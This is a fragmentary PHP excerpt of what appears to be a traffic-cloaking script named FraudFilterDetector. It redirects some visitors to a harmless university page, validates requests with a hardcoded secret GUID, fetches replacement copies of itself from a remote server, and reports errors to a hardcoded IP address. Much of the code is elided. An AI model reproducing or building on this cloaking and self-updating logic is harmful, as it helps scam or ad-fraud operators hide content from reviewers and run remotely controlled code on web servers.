...
class FraudFilterDetector_qeh6q {
    ...
    function isSignatureValid($sign, $time) {
        $str = '5249cafc-7a97-4e8b-b8fb-33c7cbcf5545.'.$this->getClid().'.'.$time;
        $sha = sha1($str);
        return $sign === $sha;
    }
...
<?php
    ...
    function safeAction() {
        $this->redirect('https://www.uni-konstanz.de/en/university/about-the-university-of-konstanz/awards-and-honours/external-awards-and-honours/peace-prize-of-the-german-book-trade/');
    }
    ...
    function getUpgradeScriptViaContents($home, $fileName) {
        $opts = array('http' =>
            array(
                'method'  => 'GET',
                'header' => 'x-ff-secret: 5249cafc-7a97-4e8b-b8fb-33c7cbcf5545',
                'timeout' => 2
            )
        );
    ...
    function upgradeScript($home, $fileName) {
        ...
        if ($output === false || !$this->isSignature2Valid($output)) {
            ...
            $headers[] = 'x-ff-secret: 5249cafc-7a97-4e8b-b8fb-33c7cbcf5545';
...
";
    ...
    function fillAllPostHeaders() {
        ...
        $headers[] = 'X-FF-P: 5249cafc-7a97-4e8b-b8fb-33c7cbcf5545';
    ...
    function notifyAboutError($message) {
        ...
        $url = 'http://139.59.212.55/ff-notify.html?v=ff1&guid=qeh6q&m='.$message;
        $ch = curl_init($url);
...
$fraudFilterDetector_qeh6q = new FraudFilterDetector_qeh6q();
$fraudFilterDetector_qeh6q->check();
